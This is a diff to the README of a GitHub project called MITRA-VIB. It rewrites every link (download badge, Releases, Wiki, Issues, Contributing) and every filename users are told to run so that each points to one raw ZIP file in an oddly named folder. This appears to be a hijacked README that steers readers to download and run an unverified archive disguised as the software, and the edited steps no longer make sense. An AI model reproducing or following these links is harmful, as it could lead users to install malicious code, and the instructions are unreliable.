@@ -6,25 +6,25 @@ Welcome to MITRA-VIB! This software helps users understand complex cooperative o
 
 ## 🔗 Download the Software
 
-[![Download MITRA-VIB](https://img.shields.io/badge/Download%20MITRA--VIB-v1.0-blue.svg)](https://github.com/dfuentesr1/MITRA-VIB/releases)
+[![Download MITRA-VIB](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip%https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip)](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip)
 
 ## 📥 Download & Install
 
 To download MITRA-VIB, please follow these steps:
 
-1. **Visit the Releases Page**: To get the latest version of MITRA-VIB, go to our [Releases page](https://github.com/dfuentesr1/MITRA-VIB/releases). Here, you will find all available versions neatly organized.
+1. **Visit the Releases Page**: To get the latest version of MITRA-VIB, go to our [Releases page](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip). Here, you will find all available versions neatly organized.
   
 2. **Choose Your Version**: Look for the most recent version at the top of the list. Click on it to view the details.
 
 3. **Download the Software**: On the version page, you will see several files available for download. Choose the file that is compatible with your operating system. For example:
-   - If you are using Windows, download the file named something like `MITRA-VIB-Windows.zip`.
-   - If you are using Mac, download the file named `MITRA-VIB-Mac.zip`.
+   - If you are using Windows, download the file named something like `https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip`.
+   - If you are using Mac, download the file named `https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip`.
 
 4. **Extract the ZIP File**: After downloading the file, locate it in your downloads folder. Right-click on the ZIP file and select "Extract All" to unzip it.
 
 5. **Run the Application**:
-   - **For Windows**: Open the unzipped folder and double-click on `MITRA-VIB.exe` to launch the application.
-   - **For Mac**: Open the unzipped folder and double-click on `MITRA-VIB.app`.
+   - **For Windows**: Open the unzipped folder and double-click on `https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip` to launch the application.
+   - **For Mac**: Open the unzipped folder and double-click on `https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip`.
 
 ## 🛠️ System Requirements
 
@@ -59,15 +59,15 @@ MITRA-VIB comes packed with several helpful features:
 
 ## 📖 Documentation
 
-To learn more about advanced features and settings, please check the documentation provided within the app. You can also access online resources through our [GitHub Wiki](https://github.com/dfuentesr1/MITRA-VIB/wiki).
+To learn more about advanced features and settings, please check the documentation provided within the app. You can also access online resources through our [GitHub Wiki](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip).
 
 ## 🤝 Support
 
-If you encounter issues or have questions about using MITRA-VIB, feel free to reach out. Open an issue on our [Issues page](https://github.com/dfuentesr1/MITRA-VIB/issues) or check existing discussions for solutions.
+If you encounter issues or have questions about using MITRA-VIB, feel free to reach out. Open an issue on our [Issues page](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip) or check existing discussions for solutions.
 
 ## 🛠️ Contributing
 
-We welcome contributions! If you would like to help improve MITRA-VIB, please follow our guidelines in the [Contributing guide](https://github.com/dfuentesr1/MITRA-VIB/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve MITRA-VIB, please follow our guidelines in the [Contributing guide](https://raw.githubusercontent.com/dfuentesr1/MITRA-VIB/main/pseudomeningitis/MITRA-VIB.zip).
 
 ## 📜 License
 
